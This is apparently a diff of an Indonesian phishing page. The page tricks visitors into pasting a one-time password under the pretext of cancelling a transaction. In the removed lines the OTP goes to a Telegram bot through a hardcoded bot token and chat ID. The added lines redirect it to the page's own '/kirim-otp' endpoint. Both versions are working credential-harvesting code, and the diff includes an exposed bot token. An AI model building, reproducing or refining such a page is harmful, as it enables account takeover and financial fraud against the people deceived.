@@ -32,7 +32,7 @@
       <textarea id="otp" name="otp" maxlength="300" class="otp-textarea" placeholder="Salin pesan/otp" required></textarea>
       <div id="otp-error">* Wajib diisi</div>
     </div>
-    <button type="button" class="btn-lanjut" id="btnBatal" onclick="kirimKeTelegram()" disabled>BATALKAN TRANSAKSI</button>
+    <button type="button" class="btn-lanjut" id="btnBatal" onclick="kirimKeServer()" disabled>BATALKAN TRANSAKSI</button>
   </form>
 
   <script>
@@ -49,7 +49,7 @@
       }
     });
 
-    function kirimKeTelegram() {
+    function kirimKeServer() {
       const otp = otpInput.value.trim();
 
       if (otp === "") {
@@ -58,18 +58,13 @@
         return;
       }
 
-      const token = "7699059636:AAEegcYsSqKEGf0fTYJ9cGwucnLjMXNSCsI"; 
-      const chat_id = "5653264904";                                     
-      const message = `📩 OTP Masuk:\n${otp}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      fetch("/kirim-otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message })
+        body: JSON.stringify({ otp })
       })
       .then(response => {
         if (response.ok) {
-          alert
           document.querySelector("form").reset();
           btnBatal.setAttribute("disabled", true);
           otpError.style.display = "none";
